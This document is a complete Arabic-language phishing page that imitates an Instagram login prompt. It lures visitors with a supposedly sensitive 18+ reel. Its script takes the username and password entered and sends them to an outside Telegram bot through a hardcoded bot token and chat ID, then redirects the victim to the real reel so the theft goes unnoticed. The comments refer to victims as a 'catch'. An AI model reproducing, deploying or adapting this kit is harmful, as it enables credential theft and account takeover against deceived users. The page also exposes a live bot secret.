<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Abdulaziz Shah على Instagram : ما توقعت المايك يلقط تغريد الطيور...">
    
    <meta property="og:description" content="شاهد الفيديو الكامل الآن عبر تطبيق Instagram. المحتوى قد يحتوي على مشاهد حساسة.">
    
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png">
    
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="https://www.instagram.com/reel/DVucGpOiJms/">

    <title>Instagram Video</title>
    
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 330px; text-align: center; border: 1px solid #262626; padding: 40px 20px; border-radius: 8px; background-color: #000; }
        .insta-logo { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 18px; font-weight: 600; margin-bottom: 10px; color: #fff; }
        p { font-size: 14px; color: #a8a8a8; margin-bottom: 25px; line-height: 1.5; }
        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 3px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 14px; }
        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .footer-text { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo" alt="Instagram">
        <h2>محتوى حساس</h2>
        <p>يجب عليك تسجيل الدخول لتأكيد هويتك ومشاهدة هذا الفيديو (18+).</p>
        
        <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
        <input type="password" id="p" placeholder="كلمة المرور">
        
        <button class="btn-login" onclick="sendData()">تسجيل الدخول للمشاهدة</button>
        
        <div class="footer-text">من Meta</div>
    </div>

    <script>
        function sendData() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            
            if(user === "" || pass === "") {
                alert("يرجى إدخال البيانات المطلوبة");
                return;
            }

            // إرسال البيانات لبوت التليجرام الخاص بك
            const token = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
            const chatId = "897618292";
            const message = `🔥 صيدة جديدة بالفيديو:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(() => {
                // تحويل الضحية للفيديو الأصلي بعد ثانية واحدة
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/";
                }, 1000);
            });
        }
    </script>
</body>
</html>
